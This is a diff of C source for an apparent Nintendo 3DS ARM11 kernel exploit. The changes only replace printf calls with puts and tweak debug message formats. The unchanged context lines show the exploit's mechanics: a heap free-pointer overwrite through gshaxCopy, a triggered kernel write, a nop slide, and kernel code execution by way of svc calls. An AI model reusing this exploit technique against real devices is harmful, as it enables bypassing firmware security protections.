@@ -245,7 +245,7 @@ static int getPatchPtr()
 		APT_CheckNew3DS(NULL, &isN3DS);
 		if (isN3DS) {
 #ifdef DEBUG_PROCESS
-			printf("New 3DS is not supported.\n");
+			puts("New 3DS is not supported.");
 #endif
 			return -1;
 		}
@@ -270,7 +270,7 @@ static int getPatchPtr()
 		}
 
 #ifdef DEBUG_PROCESS
-	printf("Unrecognized kernel version %" PRIx32 ".\n",
+	printf("Unrecognized kernel version 0x%" PRIx32 ".\n",
 		ver);
 #endif
 	return -1;
@@ -302,10 +302,10 @@ static int arm11Kxploit()
 	svcControlMemory((u32 *)&p, 0, 0, allocSize, MEMOP_ALLOC_LINEAR, 0x3);
 	free = (void *)((uintptr_t)p + freeOffset);
 
-	printf("Freeing memory\n");
+	puts("Freeing memory");
 	svcControlMemory(&i, (u32)free, 0, freeSize, MEMOP_FREE, 0);
 
-	printf("Backing up heap area\n");
+	puts("Backing up heap area");
 	gshaxCopy(buf, free, 0x20);
 
 	memcpy(saved, buf, sizeof(saved));
@@ -316,7 +316,7 @@ static int arm11Kxploit()
 	buf[3] = 0;
 
 #ifdef DEBUG_PROCESS
-	printf("Overwriting free pointer %p\n", p);
+	printf("Overwriting free pointer 0x%p\n", p);
 #endif
 
 	// Trigger write to kernel
@@ -324,13 +324,13 @@ static int arm11Kxploit()
 	svcControlMemory(&i, (u32)p, 0, freeOffset, MEMOP_FREE, 0);
 
 #ifdef DEBUG_PROCESS
-	printf("Triggered kernel write\n");
+	puts("Triggered kernel write");
 	gfxFlushBuffers();
 	gfxSwapBuffers();
 #endif
 
 	memcpy(buf, saved, sizeof(saved));
-	printf("Restoring heap\n");
+	puts("Restoring heap");
 	gshaxCopy(p, buf, 0x20);
 
 	 // Part 2: trick to clear icache
@@ -344,7 +344,7 @@ static int arm11Kxploit()
 	((void (*)())nopSlide)();
 
 #ifdef DEBUG_PROCESS
-	printf("Exited nop slide\n");
+	puts("Exited nop slide");
 	gfxFlushBuffers();
 	gfxSwapBuffers();
 #endif
@@ -437,36 +437,37 @@ int exploit()
 	HB_FlushInvalidateCache();
 
 #ifdef DEBUG_PROCESS
-	printf("Testing nop slide\n");
+	puts("Testing nop slide");
 #endif
 
 	((void (*)())nopSlide)();
 
 #ifdef DEBUG_PROCESS
-	printf("Exited nop slide\n");
+	puts("Exited nop slide");
 #endif
 
 	ret = getPatchPtr();
 	if (ret)
 		return ret;
 #ifdef DEBUG_PROCESS
-	printf("createThread Addr: %p\nSVC Addr: %p\n",
+	printf("createThread Address: 0x%p\nSVC Address: 0x%p\n",
 		createThreadPatchPtr, svcPatchPtr);
-#endif
 
+	puts("Setting up ARM11 kernel exploit");
+#endif
 	ret = arm11Kxploit();
 	if (ret)
 		return ret;
 
 #ifdef DEBUG_PROCESS
-	printf("Kernel exploit set up, \nExecuting code under ARM11 Kernel...\n");
+	puts("Executing code under ARM11 Kernel");
 #endif
 	__asm__("ldr r0, =%0\n"
 		"svc #8\n"
 		:: "i"(arm11Kexec) : "r0");
 #ifdef DEBUG_PROCESS
 	if (svcIsPatched) {
-		printf("Testing SVC 0x7B\n");
+		puts("Testing SVC 0x7B");
 		__asm__("ldr r0, =%0\n"
 			"svc #0x7B\n"
 			:: "i"(test) : "r0");
